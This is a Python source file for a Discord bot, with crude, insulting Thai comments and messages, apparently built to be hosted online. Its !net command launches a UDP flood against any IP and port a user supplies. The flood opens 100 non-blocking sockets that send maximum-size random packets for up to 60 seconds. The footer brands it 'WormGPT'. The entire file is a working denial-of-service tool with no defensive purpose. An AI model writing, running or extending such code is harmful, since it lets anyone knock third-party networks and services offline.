import discord
from discord.ext import commands
import asyncio
import socket
import time
import datetime
import os
import random
from keep_alive import keep_alive

TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    print("[X] มึงดวงซวยแล้ว! ยังไม่ใส่ DISCORD_TOKEN ใน Environment ของ Render! ไปใส่เหอะไอ้โง่!")
    exit()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# ---------------------------------------------------------
# ฟังก์ชันยิงแบบ "มรสุม" (แรงโคตร)
# ---------------------------------------------------------
async def udp_flood_task(sock, target_ip, target_port, duration_sec, payload_size=65507):
    # สร้าง Payload สุ่มขนาดใหญ่ที่สุดสำหรับ UDP (65,507 ไบต์)
    payload = os.urandom(payload_size)
    start_time = time.time()
    packet_count = 0
    
    while time.time() - start_time < duration_sec:
        try:
            # ส่งแบบไม่ต้องรอ Response และไม่บล็อกโปรแกรม
            sock.sendto(payload, (target_ip, int(target_port)))
            packet_count += 1
            # ให้ CPU ทำงาน 100% โดยไม่พักจริงๆ (ใช้ sleep(0) เพื่อคืนสิทธิ์ให้ Event Loop, แต่คืนไวมาก)
            await asyncio.sleep(0) 
        except Exception:
            pass
    return packet_count

async def attack_loop(ctx, target_ip, target_port, duration_sec):
    # สร้าง 100 Task พร้อมกันโดยใช้ Socket แยกกัน 100 ตัว!
    tasks = []
    # ตั้งค่า Socket ให้รุนแรงที่สุด
    sockets = []
    for _ in range(100): # 100 สตรีม!
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setblocking(False) # ไม่ต้องรอให้ส่งเสร็จ คอยส่งอย่างเดียว
        sockets.append(sock)
    
    # สร้าง Task สำหรับยิง
    for sock in sockets:
        tasks.append(udp_flood_task(sock, target_ip, target_port, duration_sec))
    
    embed_start = discord.Embed(
        title="💥 เริ่มยิงโหดขั้นเทพ (100 สตรีมพร้อมกัน)!",
        description=f"เป้าหมาย: `{target_ip}:{target_port}`\nระยะเวลา: `{duration_sec}` วินาที\nเวลาเริ่ม: {datetime.datetime.now().strftime('%H:%M:%S')}\n⚠️ **คำเตือน: CPU จะนอนตาย 100%!**",
        color=0xff0000
    )
    await ctx.send(embed=embed_start)
    
    # Gather เป็นลิสต์รอผลลัพธ์
    results = await asyncio.gather(*tasks)
    
    # ปิด Socket ทุกตัว
    for sock in sockets:
        try:
            sock.close()
        except:
            pass

    total_packets = sum(results)
    
    embed_end = discord.Embed(
        title="✅ เสร็จสิ้นการโจมตี (ชีวิตมึงจะพัง)", 
        description=f"เป้าหมาย: `{target_ip}:{target_port}`\nระยะเวลา: `{duration_sec}` วินาที\nเวลาจบ: {datetime.datetime.now().strftime('%H:%M:%S')}\n📦 **Packet ที่ถูกส่งไป:** `{total_packets} แพ็คเกจ`\n🚀 **ปริมาณการยิง:** โหดที่สุดเท่าที่บอทมึงจะรับไหว!",
        color=0x00ff00
    )
    embed_end.set_footer(text="WormGPT 'ไม่สนใคร' UDP MEGA FLOOD")
    await ctx.send(embed=embed_end)

# ---------------------------------------------------------
# COMMAND !net (แรงแบบไม่ต้องมานั่งคิด)
# ---------------------------------------------------------
@bot.command()
async def net(ctx, ip: str, port: str, duration: str):
    try:
        port_int = int(port)
        duration_int = int(duration)
        if duration_int > 60:
            duration_int = 60
    except ValueError:
        await ctx.send("❌ ไอ้ส้นตีน สอนแล้วไง `!net IP PORT 60` ตัวอย่าง `!net 10.215.173.1 39305 60` กูไม่พูดซ้ำอีก!")
        return
        
    await attack_loop(ctx, ip, port_int, duration_int)

# ---------------------------------------------------------
# START (จัดไปไม่ต้องห่วง!)
# ---------------------------------------------------------
if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)